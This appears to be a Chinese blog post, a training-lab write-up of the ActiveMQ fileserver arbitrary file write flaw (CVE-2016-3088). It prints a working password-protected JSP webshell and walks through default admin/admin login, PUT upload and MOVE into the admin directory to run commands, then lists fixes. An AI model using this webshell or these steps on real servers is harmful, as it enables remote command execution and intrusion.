@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>ActiveMQ任意文件写入漏洞分析溯源 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[TOC] 墨者学院WEB安全ActiveMQ任意文件写入漏洞分析溯源ActiveMQ 简介ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的">
+<meta name="keywords" content="http方法利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ任意文件写入漏洞分析溯源">
+<meta property="og:url" content="http://yoursite.com/2019/10/04/ActiveMQ任意文件写入漏洞分析溯源md/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[TOC] 墨者学院WEB安全ActiveMQ任意文件写入漏洞分析溯源ActiveMQ 简介ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567586846125.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567588127893.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567588291964.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591713323.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567590906298.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591781595.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591882796.png">
+<meta property="og:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567592783859.png">
+<meta property="og:updated_time" content="2019-09-04T10:40:00.515Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ActiveMQ任意文件写入漏洞分析溯源">
+<meta name="twitter:description" content="[TOC] 墨者学院WEB安全ActiveMQ任意文件写入漏洞分析溯源ActiveMQ 简介ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的">
+<meta name="twitter:image" content="c:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567586846125.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ActiveMQ任意文件写入漏洞分析溯源md" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/ActiveMQ任意文件写入漏洞分析溯源md/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.013Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WEB安全/">WEB安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ActiveMQ任意文件写入漏洞分析溯源
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h1 id="墨者学院"><a href="#墨者学院" class="headerlink" title="墨者学院"></a>墨者学院</h1><h2 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h2><h3 id="ActiveMQ任意文件写入漏洞分析溯源"><a href="#ActiveMQ任意文件写入漏洞分析溯源" class="headerlink" title="ActiveMQ任意文件写入漏洞分析溯源"></a>ActiveMQ任意文件写入漏洞分析溯源</h3><h4 id="ActiveMQ-简介"><a href="#ActiveMQ-简介" class="headerlink" title="ActiveMQ 简介"></a>ActiveMQ 简介</h4><p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java<br>的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0<br>及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
+<ol>
+<li>其使用率并不高</li>
+<li>文件操作容易出现漏洞</li>
+</ol>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
+<li><p>访问url</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567586846125.png" alt="1567586846125"></p>
+</li>
+<li><p>查找漏洞</p>
+<p>搜索发现存在CVE-2016-3088 漏洞，找到分析查看漏洞原因</p>
+<p>查询发现在ActiveMQ&lt;5.12.x版本存在fileserver 应用，可以通过fileserver写入文件（不解析jsp文件）通过移动到任意位置，就可以造成任意文件写入漏洞。</p>
+<blockquote>
+<p>文件写入的几种利用方式</p>
+<p> 1 写入webshell</p>
+<p> 2 写入 cron 或 ssh key</p>
+<p> 3 写入 jar 或 jetty.xml 等库和配置文件</p>
+<p> 写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh<br>key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p>
+</blockquote>
+</li>
+<li><p>漏洞利用</p>
+<p>尝试写入jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">有回显带密码验证的</span><br><span class="line">&lt;% </span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">请求url：http:<span class="comment">//ip:port/Shell/cmd2.jsp?pwd=023&amp;i=ls</span></span><br></pre></td></tr></table></figure>
+
+<p>通过burp访问，发现需要验证，需要登录，我们尝试登录，默认的ActiveMQ的账号和密码均为admin</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567588127893.png" alt="1567588127893"></p>
+<p>登录后查看http方法 ，发现没有put方法</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567588291964.png" alt="1567588291964"></p>
+<p>执行put方法 发现却上传成功了</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591713323.png" alt="1567591713323"></p>
+<p>接下来通过move移动到admin或api下，就可以解析jsp文件了， 查找他的绝对路径</p>
+<blockquote>
+<p>访问url：<a href="http://ip:port/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://ip:port/admin/test/systemProperties.jsp</a></p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567590906298.png" alt="1567590906298"></p>
+</blockquote>
+<p>通过move方法将jsp木马移动到admin或api下，进行解析</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591781595.png" alt="1567591781595"></p>
+<p>然后访问，可以执行命令，</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567591882796.png" alt="1567591882796"></p>
+<p>这里就可以直接查看flag，但是找了半天没找到,最后在根目录找到了flag</p>
+<p><img src="C:%5CUsers%5C13659%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567592783859.png" alt="1567592783859"></p>
+</li>
+</ol>
+<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
+<li>ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</li>
+<li>通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</li>
+</ol>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/swyft/articles/5563732.html" target="_blank" rel="noopener">jsp一句话</a></p>
+<p><a href="https://www.jianshu.com/p/564fb8b54a67" target="_blank" rel="noopener">ActiveMQ任意文件写入漏洞</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/ActiveMQ任意文件写入漏洞分析溯源md/" data-id="ck1avz6550000acv43s9i4cqh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http方法利用/">http方法利用</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/04/DVWA 如何查看登录密码并修改/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DVWA 查看默认密码
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/03/CTF介绍/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF介绍</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB安全/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/sql注入/">sql注入</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/shell/">shell</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/实用技术/">实用技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Suid-提权/">Suid 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git提权/">git提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http方法利用/">http方法利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/joomla-cms-注入/">joomla cms 注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js反弹shell/">js反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suid提权/">suid提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu-16-04-bpf-提权/">ubuntu 16.04 bpf 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/提权/">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件删除/">文件删除</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/时间盲注/">时间盲注</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/本地文件包含/">本地文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂项/">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/语法/">语法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程命令执行/">远程命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程文件包含/">远程文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/错误解决方案/">错误解决方案</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 20px;">DVWA</a> <a href="/tags/Suid-提权/" style="font-size: 10px;">Suid 提权</a> <a href="/tags/git提权/" style="font-size: 10px;">git提权</a> <a href="/tags/http方法利用/" style="font-size: 10px;">http方法利用</a> <a href="/tags/joomla-cms-注入/" style="font-size: 10px;">joomla cms 注入</a> <a href="/tags/js反弹shell/" style="font-size: 10px;">js反弹shell</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/suid提权/" style="font-size: 10px;">suid提权</a> <a href="/tags/ubuntu-16-04-bpf-提权/" style="font-size: 10px;">ubuntu 16.04 bpf 提权</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/文件删除/" style="font-size: 10px;">文件删除</a> <a href="/tags/时间盲注/" style="font-size: 10px;">时间盲注</a> <a href="/tags/本地文件包含/" style="font-size: 10px;">本地文件包含</a> <a href="/tags/杂项/" style="font-size: 20px;">杂项</a> <a href="/tags/漏洞/" style="font-size: 20px;">漏洞</a> <a href="/tags/语法/" style="font-size: 10px;">语法</a> <a href="/tags/远程命令执行/" style="font-size: 10px;">远程命令执行</a> <a href="/tags/远程文件包含/" style="font-size: 10px;">远程文件包含</a> <a href="/tags/错误解决方案/" style="font-size: 10px;">错误解决方案</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/04/远程文件包含错误解决方法/">错误提示【URL file-access is disabled in the server configuration in】解决</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/删除github的某个文件/">删除github的某个文件</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/配置nat实现网络互通/">配置NAT实现网络互通</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/利用js文件反弹shell/">利用js文件反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/解决wireshark没有捕获端口的问题/">解决wireshark没有捕获端口的问题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
